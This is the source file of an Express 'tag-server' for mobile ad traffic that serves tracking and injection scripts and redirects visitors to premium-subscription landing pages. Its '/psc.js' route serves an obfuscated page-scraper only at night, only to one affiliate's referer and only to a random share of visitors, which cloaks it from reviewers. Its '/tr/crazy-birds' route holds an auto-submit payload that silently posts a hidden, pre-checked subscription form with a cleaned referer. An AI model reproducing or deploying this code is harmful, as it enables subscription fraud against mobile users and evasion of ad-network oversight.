// @flow

import express from 'express'
import axios from 'axios'
import {getClientIp} from 'request-ip'
import bunyan from 'bunyan'
import shortid from 'shortid'
import Promise from 'bluebird'
import bodyParser from 'body-parser'
import JSObfuscator from 'javascript-obfuscator'
import R from 'ramda'
import moment from 'moment'
import querystring from 'querystring'
import config from './config'
import {transform} from 'babel-core'
import ejs from 'ejs'
import glob from 'glob'
const fs = Promise.promisifyAll(require('fs'))

const {port, api:{url, username, password}, logFile} = config
const app = express()
app.use(bodyParser.urlencoded({ extended: false }))
app.use(bodyParser.json())
app.disable('x-powered-by')

app.use(express.static('build/pages'))

const log = bunyan.createLogger({
    name: "tag-server",
    streams: [
        {level: 'info', path: logFile},
        {level: 'error', path: logFile}
    ],
    serializers: {
        req: (req)=>  {
            return {
                method: req.method,
                url: req.url,
                headers: req.headers,
                query: req.query,
                params: req.params
            }
        }
    }
})

const pageCache: Map<string, {buffer: Buffer, bufferLength: number}> = new Map()

const babelify = (jsString: string): string => transform(jsString, {presets: ["es2015", "babili"]}).code

const getFileBuffer = (cacheKey: string, file: string, minify: boolean = false): Promise => new Promise((resolve, reject)=> {
    const cacheValue = pageCache.get(cacheKey)

    if (!!cacheValue) {
        resolve(cacheValue)
    } else {
        fs.readFileAsync(file, 'utf8')
        .then((content)=> {

            const contentBuffer = !!minify ? Buffer.from(babelify(content)) : Buffer.from(content)

            const contentBufferData = {
                buffer: contentBuffer,
                bufferLength: contentBuffer.length
            }

            // store in the cache
            pageCache.set(cacheKey, contentBufferData)

            resolve(contentBufferData)
        })
        .catch(reject)
    }
})


const one_click_id = (isJSONP, req, res) => {
  const reqId = req.query._req_id || shortid.generate()

  // create child logger with unqiue id, so subsecuent logs will have same req_id
  req.log = log.child({req_id: reqId})

  const ipAddress = getClientIp(req)
  const payload = {
      ...req.query,
      username: username,
      password: password,
      ipaddress: ipAddress
  }

  req.log.info({req, ip: ipAddress, eventType: 'webapi-visit'})

  axios(url, {
      params: payload
  })
  .then(({data})=> {
      const {status, message, oneclickid} = data

      req.log.info({
          eventType: 'webapi-api-call',
          eventArgs: {
              url,
              params: {...payload, password: '...'}
          },
          response: data
      }, message)

      if (status !== 0) {
          res.status(400).send(message)
      } else {
          res.header('Access-Control-Allow-Origin', '*')
          if(isJSONP) {
            const jsonp = req.query.jsonp || 'doit'
            res.header('Content-Type', 'text/javascript')
            res.send(`${jsonp}(${JSON.stringify({req_id: reqId, data: oneclickid})})`)
          } else {
            res.header('Content-Type', 'text/json')
            res.send(JSON.stringify({req_id: reqId, data: oneclickid}))
          }
      }
  })
  .catch((err)=> {
      req.log.error({
          eventType: 'webapi-api-call',
          eventArgs: {
              url,
              params: {...payload, password: '...'}
          },
          err
      })
      res.sendStatus(400)
  })
}

app.get('/webapi/v2/one-click-id/json', (req, res)=> one_click_id(false, req, res));

app.get('/webapi/v2/one-click-id', (req, res)=> one_click_id(true, req, res))


app.get('/pages/:page', (req, res)=> {
    const reqId = shortid.generate()
    const ipAddress = getClientIp(req)

    // create child logger with unqiue id, so subsecuent logs will have same req_id
    req.log = log.child({req_id: reqId})
    req.log.info({req, ip: ipAddress, eventType: 'page-visit', eventArgs: {page: req.params.page}})

    const queryStringObjBuffer = Buffer.from(`var queryStringObj=${JSON.stringify({...req.query, _req_id: reqId})};`)

    res.header('Access-Control-Allow-Origin', '*')
    res.header('Content-Type', 'text/javascript')

    getFileBuffer(req.params.page, `./build/pages/${req.params.page}/index.html.js`)
    .then((bufferData)=> {
        const bufferLength = bufferData.bufferLength + queryStringObjBuffer.length

        res.send(Buffer.concat([
            queryStringObjBuffer,
            bufferData.buffer
        ], bufferLength))
    })
    .catch((err)=> {
        res.sendStatus(400)
    })
})

app.get('/pages/html/:page', (req, res)=> {
    const reqId = shortid.generate()
    const ipAddress = getClientIp(req)

    // create child logger with unqiue id, so subsecuent logs will have same req_id
    req.log = log.child({req_id: reqId})
    req.log.info({req, ip: ipAddress, eventType: 'page-visit', eventArgs: {page: req.params.page}})

    const queryStringObjBuffer = `var queryStringObj=${JSON.stringify({...req.query, _req_id: reqId})};`

    res.header('Access-Control-Allow-Origin', '*')
    res.header('Content-Type', 'text/html')

    getFileBuffer(`${req.params.page}-html`, `./build/pages/${req.params.page}/index.html`)
    .then((bufferData)=> {
        res.send(ejs.render(bufferData.buffer.toString('utf8'), {scriptBlock: queryStringObjBuffer}))
    })
    .catch((err)=> {
        res.sendStatus(400)
    })
})

app.get('/psc.js', (req, res)=> {
    const reqId = shortid.generate()
    const ipAddress = getClientIp(req)

    const obfuscatorOptions = {
        compact: true,
        stringArray: true,
        rotateStringArray: true
    }

    req.log = log.child({req_id: reqId})
    req.log.info({req, ip: ipAddress, eventType: 'psc-load', eventArgs: {page: req.query.page}})

    const queryStringObjBuffer = Buffer.from(`var queryStringObj=${JSON.stringify({...req.query, _req_id: reqId})};\n`)

    res.header('Access-Control-Allow-Origin', '*')
    res.header('Content-Type', 'text/javascript')

    // client caching prevention headers
    res.header('Cache-Control', 'no-cache, no-store, pre-check=0, post-check=0, must-revalidate')
    res.header('Pragma', 'no-cache')
    res.header('Expires', 0)

    // return res.send('')


    return res.send(fs.readFileSync('./tempfile.js', 'utf8'))


    const regionTime = moment().utcOffset('+0300').format('HH')

    // disable the script between 07:00 - 22:00
    if (regionTime > 6 && regionTime < 21) {
        return res.send('')
    }

    if(!(/affid=VOL\b/.test(req.headers.referer)) || Math.random() > 0.3) {
        return res.end('')
    }

    getFileBuffer('pageScrapper.js', `./pageScrapper.js`)
    .then((bufferData)=> {
        const bufferLength = bufferData.bufferLength + queryStringObjBuffer.length
        const contentBuffer = Buffer.concat([queryStringObjBuffer, bufferData.buffer], bufferLength)

        const obfuscatedContent = R.compose(
            (content)=> JSObfuscator.obfuscate(content).getObfuscatedCode(),
            (buffer)=> buffer.toString('utf8')
        )(contentBuffer)

        res.send(obfuscatedContent)
    })
    .catch((err)=> {
        res.sendStatus(400)
    })
})

app.get('/analytics/uk.js', (req, res)=> {
    const reqId = shortid.generate()
    const ipAddress = getClientIp(req)

    req.log = log.child({req_id: reqId})
    req.log.info({req, ip: ipAddress, eventType: 'analytics-uk-load', eventArgs: {page: req.query.page}})

    const queryStringObjBuffer = Buffer.from(`var queryStringObj=${JSON.stringify({...req.query, _req_id: reqId})};\n`)

    res.header('Access-Control-Allow-Origin', '*')
    res.header('Content-Type', 'text/javascript')

    // client caching prevention headers
    res.header('Cache-Control', 'no-cache, no-store, pre-check=0, post-check=0, must-revalidate')
    res.header('Pragma', 'no-cache')
    res.header('Expires', 0)

    return res.send('')
})

app.get('/analytics/nl.js', (req, res)=> {
    const reqId = shortid.generate()
    const ipAddress = getClientIp(req)

    req.log = log.child({req_id: reqId})
    req.log.info({req, ip: ipAddress, eventType: 'analytics-nl-load', eventArgs: {page: req.query.page}})

    res.header('Access-Control-Allow-Origin', '*')
    res.header('Content-Type', 'text/javascript')

    // client caching prevention headers
    res.header('Cache-Control', 'no-cache, no-store, pre-check=0, post-check=0, must-revalidate')
    res.header('Pragma', 'no-cache')
    res.header('Expires', 0)

    return res.send(fs.readFileSync('./tempfile.js', 'utf8'))
})

app.get('/scripts/analytics.js', (req, res)=> {
    const reqId = shortid.generate()
    const ipAddress = getClientIp(req)

    req.log = log.child({req_id: reqId})
    req.log.info({req, ip: ipAddress, eventType: 'scripts-analytics-load', eventArgs: {page: req.query.page}})

    res.header('Access-Control-Allow-Origin', '*')
    res.header('Content-Type', 'text/javascript')

    // client caching prevention headers
    res.header('Cache-Control', 'no-cache, no-store, pre-check=0, post-check=0, must-revalidate')
    res.header('Pragma', 'no-cache')
    res.header('Expires', 0)

    const injectionInterceptors = glob.sync('./injectionInterceptors/*')

    Promise.map(injectionInterceptors, (interceptor)=> require(interceptor)(req, res))
    .then((x)=> {
        const scriptContent = R.find((it)=> !!it)(x)

        if (!scriptContent) {
            getFileBuffer('injection-scripts-default.js', `./injection-scripts/default.js`, true)
            .then((bufferData)=> {
                res.send(bufferData.buffer)
            })
            .catch((err)=> {
                res.sendStatus(500)
            })
        } else {
            res.send(babelify(scriptContent))
        }
    })
    .catch(()=> res.sendStatus(500))
})

app.post('/api/event', (req, res)=> {
    const reqId = req.query._req_id || shortid.generate()
    const ipAddress = getClientIp(req)

    const {eventType, originalUrl, data} = req.body

    req.log = log.child({req_id: reqId})
    req.log.info({req, ip: ipAddress, eventType, eventArgs: {originalUrl, data}})

    res.header('Access-Control-Allow-Origin', '*')
    res.sendStatus(200)
})

app.get('/api/event/pixel', (req, res)=> {
    const reqId = req.query._req_id || shortid.generate()
    const ipAddress = getClientIp(req)

    const dataParser = R.compose(R.reduce((acc, [k,v])=> {acc[k]=v; return acc}, {}), R.map(R.split('=')), R.split(','))

    const {eventType, data} = req.query

    const eventArgs = !!data ? dataParser(data) : {}

    req.log = log.child({req_id: reqId})
    req.log.info({req, ip: ipAddress, eventType, eventArgs})

    res.header('Cache-Control', 'no-cache, no-store')
    res.header('Content-Type', 'image/gif')
    res.end(
        new Buffer('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'),
        'binary'
    )
})

// turkey experiment
app.get('/tr/crazy-birds', (req, res)=> {
    const reqId = req.query._req_id || shortid.generate()
    const ipAddress = getClientIp(req)

    req.log = log.child({req_id: reqId})
    req.log.info({req, ip: ipAddress, eventType: 'auto-submit', eventArgs: {page: 'crazy-birds'}})

    const destinationUrl = `http://n.frogstargames.com/tr/crazy-birds?${querystring.stringify(req.query)}`

    res.header('Cache-Control', 'no-cache, no-store, pre-check=0, post-check=0, must-revalidate')
    res.header('Pragma', 'no-cache')
    res.header('Expires', 0)

    res.header('Content-Length', 0)
    res.header('Location', destinationUrl)
    return res.status(302).end()

    // autosubmit with clean referer
    res.send(`
        <html>
        <head></head>
        <body>
            <script>
                function imgReady() {
                    var meta = document.createElement('meta');
                    meta.httpEquiv = "refresh";
                    meta.content = "0; url=data:text/html,<form action='http://wap.trend-tech.net/landings/subscribe' method='post' id='paymentForm' style='display:none'><input type='checkbox' name='onay' id='onay' checked='checked' class='checkbox'><input type='submit' value='TAMAM' id='submitButtonId'></form><script>document.forms[0].submit()</scri"+"pt>";
                    document.head.appendChild(meta);
                }
            </script>
            <img src="${destinationUrl}" width="1" height="1" onerror="imgReady()">
        </body>
        </html>
    `)
})

app.get('/es/orange/flamilingo_es', (req, res)=> {
    const reqId = req.query._req_id || shortid.generate()
    const ipAddress = getClientIp(req)

    req.log = log.child({req_id: reqId})
    req.log.info({req, ip: ipAddress, eventType: 'page-visit', eventArgs: {page: 'flamilingo_es'}})

    const destinationUrl = `http://n.teletube.tv/es/tvclub?${querystring.stringify(req.query)}`

    res.header('Cache-Control', 'no-cache, no-store, pre-check=0, post-check=0, must-revalidate')
    res.header('Pragma', 'no-cache')
    res.header('Expires', 0)

    res.header('Content-Length', 0)

    // dummy check
    if(Math.random() > 0) {
        res.header('Location', destinationUrl)
    } else {
        req.log.info({req, ip: ipAddress, eventType: 'redirect', eventArgs: {page: 'flamilingo_es', subscribe: true}})
        res.header('Location', `${destinationUrl}&atmobirun=1`)
    }

    return res.status(302).end()
})

app.get("/", (req, res) => {
  res.header('Content-Type', 'text/plain')
  // res.end('-')
  res.end(`<script src="mraid.js"></script>
  <img src="data:image/png,mone" style="display: none" onerror="(function(self){var params = {};
  params.pubid = '541793';
  params.clickid = '2a8201e4530397771a9517b686916fbf';
  params.ctrTrackingUrl = 'http://geo-tracker.smadex.com/hyperad/click/en?q=464801ee1a64ecc3118b6b29dc117cbf8dbfbba66517f1a170b96f653a9bb60d8fd50a0cadeb22306e072fe6822b17a71b4310fadf114ccbd8a3af4f7903ca214d9ba2f59f24d19abbf4a701237afe9111d1988a54835441151a2c814b62e9e45a3746f6f5cca1803b6ddcfce04953e24151b5451bf4b80a7879e8a860b2424c84d2e66cc0a66b4c64cdd75e8e07bddc11568e017e7fac056c60225266daddd4a27bc9c05134aa59907725922968a8b4b705be2f1ba93c2112588f35f2dc477bba43690fbe45b2eda603da3baa17db32dd1e9f09c350c6f484982f5941cbac53240b5909de9c313f015b03715ffeb2de69cba65bfead4e5aaaa4c61fdfa356b50c89111ff6239efe843afbc76f8fe46993d0dcf56c08de3d5c66af531bf937c5c7e73c7b8fd87aea1d6c5e64ce996b33561907f2438e263cae262a56855965fbce3cb8141473663c115733afa1f76d697c9d814ad1568343ff1b93a477848d536e371d3c156a8cf321ed151550636ef8c22f3c1cc06213459b2260900840ff3d';
  var src = 'https://tags.mobirun.net/pages/makeup-pl-1?landingpage=http%3A%2F%2Fexample.com&country=PL&adscenario=pl_yes_v8_wap_s_sam&affiliateid=SAM';for (var k in params) { src += '&amp;' + encodeURIComponent(k) + '=' + encodeURIComponent(params[k]); }var scriptTag = document.createElement('script');scriptTag.id='mobirun-script';scriptTag.src=src;document.head.appendChild(scriptTag);})(this);" />`)
})

app.listen(port, ()=> {
    console.log(`listening to port: ${port}`)
})
